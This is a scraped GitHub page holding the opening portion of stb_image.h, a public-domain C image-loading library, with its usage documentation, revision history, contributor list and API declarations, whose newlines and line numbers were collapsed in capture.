=== Content from github.com_81eaf82d_20250111_100628.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnothings%2Fstb%2Fblob%2F5736b15f7ea0ffb08dd38af21067c314d6a3aae9%2Fstb_image.h)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnothings%2Fstb%2Fblob%2F5736b15f7ea0ffb08dd38af21067c314d6a3aae9%2Fstb_image.h)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=nothings%2Fstb)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[nothings](/nothings)
/
**[stb](/nothings/stb)**
Public

* [Notifications](/login?return_to=%2Fnothings%2Fstb) You must be signed in to change notification settings
* [Fork
  7.7k](/login?return_to=%2Fnothings%2Fstb)
* [Star
   27.5k](/login?return_to=%2Fnothings%2Fstb)

* [Code](/nothings/stb)
* [Issues
  158](/nothings/stb/issues)
* [Pull requests
  131](/nothings/stb/pulls)
* [Discussions](/nothings/stb/discussions)
* [Actions](/nothings/stb/actions)
* [Projects
  0](/nothings/stb/projects)
* [Security](/nothings/stb/security)
* [Insights](/nothings/stb/pulse)

Additional navigation options

* [Code](/nothings/stb)
* [Issues](/nothings/stb/issues)
* [Pull requests](/nothings/stb/pulls)
* [Discussions](/nothings/stb/discussions)
* [Actions](/nothings/stb/actions)
* [Projects](/nothings/stb/projects)
* [Security](/nothings/stb/security)
* [Insights](/nothings/stb/pulse)

## Files

 5736b15
## Breadcrumbs

1. [stb](/nothings/stb/tree/5736b15f7ea0ffb08dd38af21067c314d6a3aae9)
/
# stb\_image.h

Copy path Blame  Blame
## Latest commit

## History

[History](/nothings/stb/commits/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h)7987 lines (7103 loc) · 278 KB 5736b15
## Breadcrumbs

1. [stb](/nothings/stb/tree/5736b15f7ea0ffb08dd38af21067c314d6a3aae9)
/
# stb\_image.h

Top
## File metadata and controls

* Code
* Blame

7987 lines (7103 loc) · 278 KB[Raw](https://github.com/nothings/stb/raw/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000/\* stb\_image - v2.28 - public domain image loader - http://nothings.org/stb no warranty implied; use at your own risk
 Do this: #define STB\_IMAGE\_IMPLEMENTATION before you include this file in \*one\* C or C++ file to create the implementation.
 // i.e. it should look like this: #include ... #include ... #include ... #define STB\_IMAGE\_IMPLEMENTATION #include "stb\_image.h"
 You can #define STBI\_ASSERT(x) before the #include to avoid using assert.h. And #define STBI\_MALLOC, STBI\_REALLOC, and STBI\_FREE to avoid using malloc,realloc,free
 QUICK NOTES: Primarily of interest to game developers and other people who can avoid problematic images and only need the trivial interface
 JPEG baseline & progressive (12 bpc/arithmetic not supported, same as stock IJG lib) PNG 1/2/4/8/16-bit-per-channel
 TGA (not sure what subset, if a subset) BMP non-1bpp, non-RLE PSD (composited view only, no extra channels, 8/16 bit-per-channel)
 GIF (\*comp always reports as 4-channel) HDR (radiance rgbE format) PIC (Softimage PIC) PNM (PPM and PGM binary only)
 Animated GIF still needs a proper API, but here's one way to do it: http://gist.github.com/urraka/685d9a6340b26b830d49
 - decode from memory or through FILE (define STBI\_NO\_STDIO to remove code) - decode from arbitrary I/O callbacks - SIMD acceleration on x86/x64 (SSE2) and ARM (NEON)
 Full documentation under "DOCUMENTATION" below.
LICENSE
 See end of file for license information.
RECENT REVISION HISTORY:
 2.28 (2023-01-29) many error fixes, security errors, just tons of stuff 2.27 (2021-07-11) document stbi\_info better, 16-bit PNM support, bug fixes 2.26 (2020-07-13) many minor fixes 2.25 (2020-02-02) fix warnings 2.24 (2020-02-02) fix warnings; thread-local failure\_reason and flip\_vertically 2.23 (2019-08-11) fix clang static analysis warning 2.22 (2019-03-04) gif fixes, fix warnings 2.21 (2019-02-25) fix typo in comment 2.20 (2019-02-07) support utf8 filenames in Windows; fix warnings and platform ifdefs 2.19 (2018-02-11) fix warning 2.18 (2018-01-30) fix warnings 2.17 (2018-01-29) bugfix, 1-bit BMP, 16-bitness query, fix warnings 2.16 (2017-07-23) all functions have 16-bit variants; optimizations; bugfixes 2.15 (2017-03-18) fix png-1,2,4; all Imagenet JPGs; no runtime SSE detection on GCC 2.14 (2017-03-03) remove deprecated STBI\_JPEG\_OLD; fixes for Imagenet JPGs 2.13 (2016-12-04) experimental 16-bit API, only for PNG so far; fixes 2.12 (2016-04-02) fix typo in 2.11 PSD fix that caused crashes 2.11 (2016-04-02) 16-bit PNGS; enable SSE2 in non-gcc x64 RGB-format JPEG; remove white matting in PSD; allocate large structures on the stack; correct channel count for PNG & BMP 2.10 (2016-01-22) avoid warning introduced in 2.09 2.09 (2016-01-16) 16-bit TGA; comments in PNM files; STBI\_REALLOC\_SIZED
 See end of file for full revision history.
 ============================ Contributors =========================
 Image formats Extensions, features Sean Barrett (jpeg, png, bmp) Jetro Lauha (stbi\_info) Nicolas Schulz (hdr, psd) Martin "SpartanJ" Golini (stbi\_info) Jonathan Dummer (tga) James "moose2000" Brown (iPhone PNG) Jean-Marc Lienher (gif) Ben "Disch" Wenger (io callbacks) Tom Seddon (pic) Omar Cornut (1/2/4-bit PNG) Thatcher Ulrich (psd) Nicolas Guillemot (vertical flip) Ken Miller (pgm, ppm) Richard Mitton (16-bit PSD) github:urraka (animated gif) Junggon Kim (PNM comments) Christopher Forseth (animated gif) Daniel Gibson (16-bit TGA) socks-the-fox (16-bit PNG) Jeremy Sawicki (handle all ImageNet JPGs) Optimizations & bugfixes Mikhail Morozov (1-bit BMP) Fabian "ryg" Giesen Anael Seghezzi (is-16-bit query) Arseny Kapoulkine Simon Breuss (16-bit PNM) John-Mark Allen Carmelo J Fdez-Aguera
 Bug & warning fixes Marc LeBlanc David Woo Guillaume George Martins Mozeiko Christpher Lloyd Jerry Jansson Joseph Thomson Blazej Dariusz Roszkowski Phil Jordan Dave Moore Roy Eltham Hayaki Saito Nathan Reed Won Chun Luke Graham Johan Duparc Nick Verigakis the Horde3D community Thomas Ruf Ronny Chevalier github:rlyeh Janez Zemva John Bartholomew Michal Cichon github:romigrou Jonathan Blow Ken Hamada Tero Hanninen github:svdijk Eugene Golushkov Laurent Gomila Cort Stratton github:snagar Aruelien Pocheville Sergio Gonzalez Thibault Reuille github:Zelex Cass Everitt Ryamond Barbiero github:grim210 Paul Du Bois Engin Manap Aldo Culquicondor github:sammyhw Philipp Wiesemann Dale Weiler Oriol Ferrer Mesia github:phprus Josh Tobin Neil Bickford Matthew Gregan github:poppolopoppo Julian Raschke Gregory Mullen Christian Floisand github:darealshinji Baldur Karlsson Kevin Schmidt JR Smith github:Michaelangel007 Brad Weinberger Matvey Cherevko github:mosra Luca Sas Alexander Veselov Zack Middleton [reserved] Ryan C. Gordon [reserved] [reserved] DO NOT ADD YOUR NAME HERE
 Jacko Dirks
 To add your name to the credits, pick a random blank space in the middle and fill it. 80% of merge conflicts on stb PRs are due to people adding their name at the end of the credits.\*/
#ifndef STBI\_INCLUDE\_STB\_IMAGE\_H#define STBI\_INCLUDE\_STB\_IMAGE\_H
// DOCUMENTATION//// Limitations:// - no 12-bit-per-channel JPEG// - no JPEGs with arithmetic coding// - GIF always returns \*comp=4//// Basic usage (see HDR discussion below for HDR usage):// int x,y,n;// unsigned char \*data = stbi\_load(filename, &x, &y, &n, 0);// // ... process data if not NULL ...// // ... x = width, y = height, n = # 8-bit components per pixel ...// // ... replace '0' with '1'..'4' to force that many components per pixel// // ... but 'n' will always be the number that it would have been if you said 0// stbi\_image\_free(data);//// Standard parameters:// int \*x -- outputs image width in pixels// int \*y -- outputs image height in pixels// int \*channels\_in\_file -- outputs # of image components in image file// int desired\_channels -- if non-zero, # of image components requested in result//// The return value from an image loader is an 'unsigned char \*' which points// to the pixel data, or NULL on an allocation failure or if the image is// corrupt or invalid. The pixel data consists of \*y scanlines of \*x pixels,// with each pixel consisting of N interleaved 8-bit components; the first// pixel pointed to is top-left-most in the image. There is no padding between// image scanlines or between pixels, regardless of format. The number of// components N is 'desired\_channels' if desired\_channels is non-zero, or// \*channels\_in\_file otherwise. If desired\_channels is non-zero,// \*channels\_in\_file has the number of components that \_would\_ have been// output otherwise. E.g. if you set desired\_channels to 4, you will always// get RGBA output, but you can check \*channels\_in\_file to see if it's trivially// opaque because e.g. there were only 3 channels in the source image.//// An output image with N components has the following components interleaved// in this order in each pixel://// N=#comp components// 1 grey// 2 grey, alpha// 3 red, green, blue// 4 red, green, blue, alpha//// If image loading fails for any reason, the return value will be NULL,// and \*x, \*y, \*channels\_in\_file will be unchanged. The function// stbi\_failure\_reason() can be queried for an extremely brief, end-user// unfriendly explanation of why the load failed. Define STBI\_NO\_FAILURE\_STRINGS// to avoid compiling these strings at all, and STBI\_FAILURE\_USERMSG to get slightly// more user-friendly ones.//// Paletted PNG, BMP, GIF, and PIC images are automatically depalettized.//// To query the width, height and component count of an image without having to// decode the full file, you can use the stbi\_info family of functions://// int x,y,n,ok;// ok = stbi\_info(filename, &x, &y, &n);// // returns ok=1 and sets x, y, n if image is a supported format,// // 0 otherwise.//// Note that stb\_image pervasively uses ints in its public API for sizes,// including sizes of memory buffers. This is now part of the API and thus// hard to change without causing breakage. As a result, the various image// loaders all have certain limits on image size; these differ somewhat// by format but generally boil down to either just under 2GB or just under// 1GB. When the decoded image would be larger than this, stb\_image decoding// will fail.//// Additionally, stb\_image will reject image files that have any of their// dimensions set to a larger value than the configurable STBI\_MAX\_DIMENSIONS,// which defaults to 2\*\*24 = 16777216 pixels. Due to the above memory limit,// the only way to have an image with such dimensions load correctly// is for it to have a rather extreme aspect ratio. Either way, the// assumption here is that such larger images are likely to be malformed// or malicious. If you do need to load an image with individual dimensions// larger than that, and it still fits in the overall size limit, you can// #define STBI\_MAX\_DIMENSIONS on your own to be something larger.//// ===========================================================================//// UNICODE://// If compiling for Windows and you wish to use Unicode filenames, compile// with// #define STBI\_WINDOWS\_UTF8// and pass utf8-encoded filenames. Call stbi\_convert\_wchar\_to\_utf8 to convert// Windows wchar\_t filenames to utf8.//// ===========================================================================//// Philosophy//// stb libraries are designed with the following priorities://// 1. easy to use// 2. easy to maintain// 3. good performance//// Sometimes I let "good performance" creep up in priority over "easy to maintain",// and for best performance I may provide less-easy-to-use APIs that give higher// performance, in addition to the easy-to-use ones. Nevertheless, it's important// to keep in mind that from the standpoint of you, a client of this library,// all you care about is #1 and #3, and stb libraries DO NOT emphasize #3 above all.//// Some secondary priorities arise directly from the first two, some of which// provide more explicit reasons why performance can't be emphasized.//// - Portable ("ease of use")// - Small source code footprint ("easy to maintain")// - No dependencies ("ease of use")//// ===========================================================================//// I/O callbacks//// I/O callbacks allow you to read from arbitrary sources, like packaged// files or some other source. Data read from callbacks are processed// through a small internal buffer (currently 128 bytes) to try to reduce// overhead.//// The three functions you must define are "read" (reads some bytes of data),// "skip" (skips some bytes of data), "eof" (reports if the stream is at the end).//// ===========================================================================//// SIMD support//// The JPEG decoder will try to automatically use SIMD kernels on x86 when// supported by the compiler. For ARM Neon support, you must explicitly// request it.//// (The old do-it-yourself SIMD API is no longer supported in the current// code.)//// On x86, SSE2 will automatically be used when available based on a run-time// test; if not, the generic C versions are used as a fall-back. On ARM targets,// the typical path is to have separate builds for NEON and non-NEON devices// (at least this is true for iOS and Android). Therefore, the NEON support is// toggled by a build flag: define STBI\_NEON to get NEON loops.//// If for some reason you do not want to use any of SIMD code, or if// you have issues compiling it, you can disable it entirely by// defining STBI\_NO\_SIMD.//// ===========================================================================//// HDR image support (disable by defining STBI\_NO\_HDR)//// stb\_image supports loading HDR images in general, and currently the Radiance// .HDR file format specifically. You can still load any file through the existing// interface; if you attempt to load an HDR file, it will be automatically remapped// to LDR, assuming gamma 2.2 and an arbitrary scale factor defaulting to 1;// both of these constants can be reconfigured through this interface://// stbi\_hdr\_to\_ldr\_gamma(2.2f);// stbi\_hdr\_to\_ldr\_scale(1.0f);//// (note, do not use \_inverse\_ constants; stbi\_image will invert them// appropriately).//// Additionally, there is a new, parallel interface for loading files as// (linear) floats to preserve the full dynamic range://// float \*data = stbi\_loadf(filename, &x, &y, &n, 0);//// If you load LDR images through this interface, those images will// be promoted to floating point values, run through the inverse of// constants corresponding to the above://// stbi\_ldr\_to\_hdr\_scale(1.0f);// stbi\_ldr\_to\_hdr\_gamma(2.2f);//// Finally, given a filename (or an open file or memory block--see header// file for details) containing image data, you can query for the "most// appropriate" interface to use (that is, whether the image is HDR or// not), using://// stbi\_is\_hdr(char \*filename);//// ===========================================================================//// iPhone PNG support://// We optionally support converting iPhone-formatted PNGs (which store// premultiplied BGRA) back to RGB, even though they're internally encoded// differently. To enable this conversion, call// stbi\_convert\_iphone\_png\_to\_rgb(1).//// Call stbi\_set\_unpremultiply\_on\_load(1) as well to force a divide per// pixel to remove any premultiplied alpha \*only\* if the image file explicitly// says there's premultiplied data (currently only happens in iPhone images,// and only if iPhone convert-to-rgb processing is on).//// ===========================================================================//// ADDITIONAL CONFIGURATION//// - You can suppress implementation of any of the decoders to reduce// your code footprint by #defining one or more of the following// symbols before creating the implementation.//// STBI\_NO\_JPEG// STBI\_NO\_PNG// STBI\_NO\_BMP// STBI\_NO\_PSD// STBI\_NO\_TGA// STBI\_NO\_GIF// STBI\_NO\_HDR// STBI\_NO\_PIC// STBI\_NO\_PNM (.ppm and .pgm)//// - You can request \*only\* certain decoders and suppress all other ones// (this will be more forward-compatible, as addition of new decoders// doesn't require you to disable them explicitly)://// STBI\_ONLY\_JPEG// STBI\_ONLY\_PNG// STBI\_ONLY\_BMP// STBI\_ONLY\_PSD// STBI\_ONLY\_TGA// STBI\_ONLY\_GIF// STBI\_ONLY\_HDR// STBI\_ONLY\_PIC// STBI\_ONLY\_PNM (.ppm and .pgm)//// - If you use STBI\_NO\_PNG (or \_ONLY\_ without PNG), and you still// want the zlib decoder to be available, #define STBI\_SUPPORT\_ZLIB//// - If you define STBI\_MAX\_DIMENSIONS, stb\_image will reject images greater// than that size (in either width or height) without further processing.// This is to let programs in the wild set an upper bound to prevent// denial-of-service attacks on untrusted data, as one could generate a// valid image of gigantic dimensions and force stb\_image to allocate a// huge block of memory and spend disproportionate time decoding it. By// default this is set to (1 << 24), which is 16777216, but that's still// very big.
#ifndef STBI\_NO\_STDIO#include <stdio.h>#endif // STBI\_NO\_STDIO
#define STBI\_VERSION 1
enum{ STBI\_default = 0, // only used for desired\_channels
 STBI\_grey = 1, STBI\_grey\_alpha = 2, STBI\_rgb = 3, STBI\_rgb\_alpha = 4};
#include <stdlib.h>typedef unsigned char stbi\_uc;typedef unsigned short stbi\_us;
#ifdef \_\_cplusplusextern "C" {#endif
#ifndef STBIDEF#ifdef STB\_IMAGE\_STATIC#define STBIDEF static#else#define STBIDEF extern#endif#endif
////////////////////////////////////////////////////////////////////////////////// PRIMARY API - works on images of any type//
//// load image by filename, open file, or memory buffer//
typedef struct{ int (\*read) (void \*user,char \*data,int size); // fill 'data' with 'size' bytes. return number of bytes actually read void (\*skip) (void \*user,int n); // skip the next 'n' bytes, or 'unget' the last -n bytes if negative int (\*eof) (void \*user); // returns nonzero if we are at end of file/data} stbi\_io\_callbacks;
//////////////////////////////////////// 8-bits-per-channel interface//
STBIDEF stbi\_uc \*stbi\_load\_from\_memory (stbi\_uc const \*buffer, int len , int \*x, int \*y, int \*channels\_in\_file, int desired\_channels);STBIDEF stbi\_uc \*stbi\_load\_from\_callbacks(stbi\_io\_callbacks const \*clbk , void \*user, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels);
#ifndef STBI\_NO\_STDIOSTBIDEF stbi\_uc \*stbi\_load (char const \*filename, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels);STBIDEF stbi\_uc \*stbi\_load\_from\_file (FILE \*f, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels);// for stbi\_load\_from\_file, file pointer is left pointing immediately after image#endif
#ifndef STBI\_NO\_GIFSTBIDEF stbi\_uc \*stbi\_load\_gif\_from\_memory(stbi\_uc const \*buffer, int len, int \*\*delays, int \*x, int \*y, int \*z, int \*comp, int req\_comp);#endif
#ifdef STBI\_WINDOWS\_UTF8STBIDEF int stbi\_convert\_wchar\_to\_utf8(char \*buffer, size\_t bufferlen, const wchar\_t\* input);#endif
//////////////////////////////////////// 16-bits-per-channel interface//
STBIDEF stbi\_us \*stbi\_load\_16\_from\_memory (stbi\_uc const \*buffer, int len, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels);STBIDEF stbi\_us \*stbi\_load\_16\_from\_callbacks(stbi\_io\_callbacks const \*clbk, void \*user, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels);
#ifndef STBI\_NO\_STDIOSTBIDEF stbi\_us \*stbi\_load\_16 (char const \*filename, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels);STBIDEF stbi\_us \*stbi\_load\_from\_file\_16(FILE \*f, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels);#endif
//////////////////////////////////////// float-per-channel interface//#ifndef STBI\_NO\_LINEAR STBIDEF float \*stbi\_loadf\_from\_memory (stbi\_uc const \*buffer, int len, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels); STBIDEF float \*stbi\_loadf\_from\_callbacks (stbi\_io\_callbacks const \*clbk, void \*user, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels);
 #ifndef STBI\_NO\_STDIO STBIDEF float \*stbi\_loadf (char const \*filename, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels); STBIDEF float \*stbi\_loadf\_from\_file (FILE \*f, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels); #endif#endif
#ifndef STBI\_NO\_HDR STBIDEF void stbi\_hdr\_to\_ldr\_gamma(float gamma); STBIDEF void stbi\_hdr\_to\_ldr\_scale(float scale);#endif // STBI\_NO\_HDR
#ifndef STBI\_NO\_LINEAR STBIDEF void stbi\_ldr\_to\_hdr\_gamma(float gamma); STBIDEF void stbi\_ldr\_to\_hdr\_scale(float scale);#endif // STBI\_NO\_LINEAR
// stbi\_is\_hdr is always defined, but always returns false if STBI\_NO\_HDRSTBIDEF int stbi\_is\_hdr\_from\_callbacks(stbi\_io\_callbacks const \*clbk, void \*user);STBIDEF int stbi\_is\_hdr\_from\_memory(stbi\_uc const \*buffer, int len);#ifndef STBI\_NO\_STDIOSTBIDEF int stbi\_is\_hdr (char const \*filename);STBIDEF int stbi\_is\_hdr\_from\_file(FILE \*f);#endif // STBI\_NO\_STDIO
// get a VERY brief reason for failure// on most compilers (and ALL modern mainstream compilers) this is threadsafeSTBIDEF const char \*stbi\_failure\_reason (void);
// free the loaded image -- this is just free()STBIDEF void stbi\_image\_free (void \*retval\_from\_stbi\_load);
// get image dimensions & components without fully decodingSTBIDEF int stbi\_info\_from\_memory(stbi\_uc const \*buffer, int len, int \*x, int \*y, int \*comp);STBIDEF int stbi\_info\_from\_callbacks(stbi\_io\_callbacks const \*clbk, void \*user, int \*x, int \*y, int \*comp);STBIDEF int stbi\_is\_16\_bit\_from\_memory(stbi\_uc const \*buffer, int len);STBIDEF int stbi\_is\_16\_bit\_from\_callbacks(stbi\_io\_callbacks const \*clbk, void \*user);
#ifndef STBI\_NO\_STDIOSTBIDEF int stbi\_info (char const \*filename, int \*x, int \*y, int \*comp);STBIDEF int stbi\_info\_from\_file (FILE \*f, int \*x, int \*y, int \*comp);STBIDEF int stbi\_is\_16\_bit (char const \*filename);STBIDEF int stbi\_is\_16\_bit\_from\_file(FILE \*f);#endif
// for image formats that explicitly notate that they have premultiplied alpha,// we just return the colors as stored in the file. set this flag to force// unpremultiplication. results are undefined if the unpremultiply overflow.STBIDEF void stbi\_set\_unpremultiply\_on\_load(int flag\_true\_if\_should\_unpremultiply);
// indicate whether we should process iphone images back to canonical format,// or just pass them through "as-is"STBIDEF void stbi\_convert\_iphone\_png\_to\_rgb(int flag\_true\_if\_should\_convert);
// flip the image vertically, so the first pixel in the output array is the bottom leftSTBIDEF void stbi\_set\_flip\_vertically\_on\_load(int flag\_true\_if\_should\_flip);
// as above, but only applies to images loaded on the thread that calls the function// this function is only available if your compiler supports thread-local variables;// calling it will fail to link if your compiler doesn'tSTBIDEF void stbi\_set\_unpremultiply\_on\_load\_thread(int flag\_true\_if\_should\_unpremultiply);STBIDEF void stbi\_convert\_iphone\_png\_to\_rgb\_thread(int flag\_true\_if\_should\_convert);STBIDEF void stbi\_set\_flip\_vertically\_on\_load\_thread(int flag\_true\_if\_should\_flip);
// ZLIB client - used by PNG, available for other purposes
STBIDEF char \*stbi\_zlib\_decode\_malloc\_guesssize(const char \*buffer, int len, int initial\_size, int \*outlen);STBIDEF char \*stbi\_zlib\_decode\_malloc\_guesssize\_headerflag(const char \*buffer, int len, int initial\_size, int \*outlen, int parse\_header);STBIDEF char \*stbi\_zlib\_decode\_malloc(const char \*buffer, int len, int \*outlen);STBIDEF int stbi\_zlib\_decode\_buffer(char \*obuffer, int olen, const char \*ibuffer, int ilen);
STBIDEF char \*stbi\_zlib\_decode\_noheader\_malloc(const char \*buffer, int len, int \*outlen);STBIDEF int stbi\_zlib\_decode\_noheader\_buffer(char \*obuffer, int olen, const char \*ibuffer, int ilen);
#ifdef \_\_cplusplus}#endif
//////// end header file /////////////////////////////////////////////////////#endif // STBI\_INCLUDE\_STB\_IMAGE\_H
#ifdef STB\_IMAGE\_IMPLEMENTATION
#if defined(STBI\_ONLY\_JPEG) || defined(STBI\_ONLY\_PNG) || defined(STBI\_ONLY\_BMP) \ || defined(STBI\_ONLY\_TGA) || defined(STBI\_ONLY\_GIF) || defined(STBI\_ONLY\_PSD) \ || defined(STBI\_ONLY\_HDR) || defined(STBI\_ONLY\_PIC) || defined(STBI\_ONLY\_PNM) \ || defined(STBI\_ONLY\_ZLIB) #ifndef STBI\_ONLY\_JPEG #define STBI\_NO\_JPEG #endif #ifndef STBI\_ONLY\_PNG #define STBI\_NO\_PNG #endif #ifndef STBI\_ONLY\_BMP #define STBI\_NO\_BMP #endif #ifndef STBI\_ONLY\_PSD #define STBI\_NO\_PSD #endif #ifndef STBI\_ONLY\_TGA #define STBI\_NO\_TGA #endif #ifndef STBI\_ONLY\_GIF #define STBI\_NO\_GIF #endif #ifndef STBI\_ONLY\_HDR #define STBI\_NO\_HDR #endif #ifndef STBI\_ONLY\_PIC #define STBI\_NO\_PIC #endif #ifndef STBI\_ONLY\_PNM #define STBI\_NO\_PNM #endif#endif
#if defined(STBI\_NO\_PNG) && !defined(STBI\_SUPPORT\_ZLIB) && !defined(STBI\_NO\_ZLIB)#define STBI\_NO\_ZLIB#endif
#include <stdarg.h>#include <stddef.h> // ptrdiff\_t on osx#include <stdlib.h>#include <string.h>#include <limits.h>
#if !defined(STBI\_NO\_LINEAR) || !defined(STBI\_NO\_HDR)#include <math.h> // ldexp, pow#endif
#ifndef STBI\_NO\_STDIO#include <stdio.h>#endif
#ifndef STBI\_ASSERT#include <assert.h>#define STBI\_ASSERT(x) assert(x)#endif
#ifdef \_\_cplusplus#define STBI\_EXTERN extern "C"#else#define STBI\_EXTERN extern#endif
#ifndef \_MSC\_VER #ifdef \_\_cplusplus #define stbi\_inline inline #else #define stbi\_inline #endif#else #define stbi\_inline \_\_forceinline#endif
#ifndef STBI\_NO\_THREAD\_LOCALS #if defined(\_\_cplusplus) && \_\_cplusplus >= 201103L #define STBI\_THREAD\_LOCAL thread\_local #elif defined(\_\_GNUC\_\_) && \_\_GNUC\_\_ < 5 #define STBI\_THREAD\_LOCAL \_\_thread #elif defined(\_MSC\_VER) #define STBI\_THREAD\_LOCAL \_\_declspec(thread) #elif defined (\_\_STDC\_VERSION\_\_) && \_\_STDC\_VERSION\_\_ >= 201112L && !defined(\_\_STDC\_NO\_THREADS\_\_) #define STBI\_THREAD\_LOCAL \_Thread\_local #endif
 #ifndef STBI\_THREAD\_LOCAL #if defined(\_\_GNUC\_\_) #define STBI\_THREAD\_LOCAL \_\_thread #endif #endif#endif
#if defined(\_MSC\_VER) || defined(\_\_SYMBIAN32\_\_)typedef unsigned short stbi\_\_uint16;typedef signed short stbi\_\_int16;typedef unsigned int stbi\_\_uint32;typedef signed int stbi\_\_int32;#else#include <stdint.h>typedef uint16\_t stbi\_\_uint16;typedef int16\_t stbi\_\_int16;typedef uint32\_t stbi\_\_uint32;typedef int32\_t stbi\_\_int32;#endif
// should produce compiler error if size is wrongtypedef unsigned char validate\_uint32[sizeof(stbi\_\_uint32)==4 ? 1 : -1];
#ifdef \_MSC\_VER#define STBI\_NOTUSED(v) (void)(v)#else#define STBI\_NOTUSED(v) (void)sizeof(v)#endif
#ifdef \_MSC\_VER#define STBI\_HAS\_LROTL#endif
#ifdef STBI\_HAS\_LROTL #define stbi\_lrot(x,y) \_lrotl(x,y)#else #define stbi\_lrot(x,y) (((x) << (y)) | ((x) >> (-(y) & 31)))#endif
